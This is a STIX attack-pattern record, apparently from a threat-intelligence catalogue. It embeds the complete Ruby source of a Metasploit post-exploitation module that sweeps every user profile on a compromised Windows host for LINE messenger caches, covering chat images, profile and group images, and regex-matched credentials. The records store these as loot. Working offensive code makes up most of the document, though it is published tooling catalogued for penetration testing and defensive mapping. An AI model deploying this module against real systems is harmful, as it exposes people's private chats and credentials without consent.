{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d0a8b6fe-7f63-4803-9fb5-b387890b844a",
    "created": "2024-08-14T16:33:08.756201Z",
    "modified": "2024-08-14T16:33:08.756205Z",
    "name": "LINE credential gatherer",
    "description": " PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems. PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries. Further details can be found in the module documentation. This is a module that searches for credentials in LINE desktop application on a windows remote host. LINE is the most popular Instant Messenger app in Japan.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/line.rb",
            "external_id": "line.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  # this associative array defines the artifacts known to PackRat\n  include Msf::Post::File\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::Windows::Packrat\n\n  ARTIFACTS =\n    {\n      application: 'line',\n      app_category: 'chats',\n      gatherable_artifacts: [\n        {\n          filetypes: 'images',\n          path: 'LocalAppData',\n          dir: 'LINE',\n          artifact_file_name: '*.png',\n          description: 'Image cache with png extension',\n          credential_type: 'chat_log'\n        },\n        {\n          filetypes: 'images',\n          path: 'LocalAppData',\n          dir: 'LINE',\n          artifact_file_name: '*.jpeg',\n          description: 'Image cache for jpg cache',\n          credential_type: 'chat_log'\n        },\n        {\n          filetypes: 'images',\n          path: 'LocalAppData',\n          dir: 'LINE\\\\Cache\\\\p',\n          artifact_file_name: '*',\n          description: 'Image cache for profile images of users',\n          credential_type: 'chat_log'\n        },\n        {\n          filetypes: 'images',\n          path: 'LocalAppData',\n          dir: 'LINE\\\\Cache\\\\g',\n          artifact_file_name: '*',\n          description: 'Image cache for group icons',\n          credential_type: 'chat_log'\n        },\n        {\n          filetypes: 'images',\n          path: 'LocalAppData',\n          dir: 'LINE\\\\Cache\\\\m',\n          artifact_file_name: '*',\n          description: 'Image cache for images sent through chat',\n          credential_type: 'chat_log'\n        },\n        {\n          filetypes: 'images',\n          path: 'LocalAppData',\n          dir: 'LINE\\\\Cache\\\\e',\n          artifact_file_name: '*',\n          description: 'Image cache for profile images sent by official accounts',\n          credential_type: 'chat_log'\n        },\n        {\n          filetypes: 'images',\n          path: 'LocalAppData',\n          dir: 'LINE\\\\Data\\\\pizza',\n          artifact_file_name: '*',\n          description: 'Image cache for profile images of users',\n          credential_type: 'chat_log'\n        }\n      ]\n    }.freeze\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'LINE credential gatherer',\n        'Description' => %q{\n          PackRat is a post-exploitation module that gathers file and information artifacts from end users' systems.\n          PackRat searches for and downloads files of interest (such as config files, and received and deleted emails) and extracts information (such as contacts and usernames and passwords), using regexp, JSON, XML, and SQLite queries.\n          Further details can be found in the module documentation.\n          This is a module that searches for credentials in LINE desktop application on a windows remote host. LINE is the most popular Instant Messenger app in Japan.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Kazuyoshi Maruta',\n          'Daniel Hallsworth',\n          'Barwar Salim M',\n          'Z. Cliffe Schreuders', # http://z.cliffe.schreuders.org\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),\n        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),\n        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),\n        # enumerates the options based on the artifacts that are defined below\n        OptEnum.new('ARTIFACTS', [false, 'Type of artifacts to collect', 'All', ARTIFACTS[:gatherable_artifacts].map { |k| k[:filetypes] }.uniq.unshift('All')])\n      ]\n    )\n  end\n\n  def run\n    print_status('Filtering based on these selections:  ')\n    print_status(\"ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}\")\n    print_status(\"STORE_LOOT: #{datastore['STORE_LOOT']}\")\n    print_status(\"EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\\n\")\n\n    # used to grab files for each user on the remote host\n    grab_user_profiles.each do |userprofile|\n      run_packrat(userprofile, ARTIFACTS)\n    end\n\n    print_status 'PackRat credential sweep Completed'\n  end\nend\n",
    "x_mitre_platforms": [
        "['win']"
    ]
}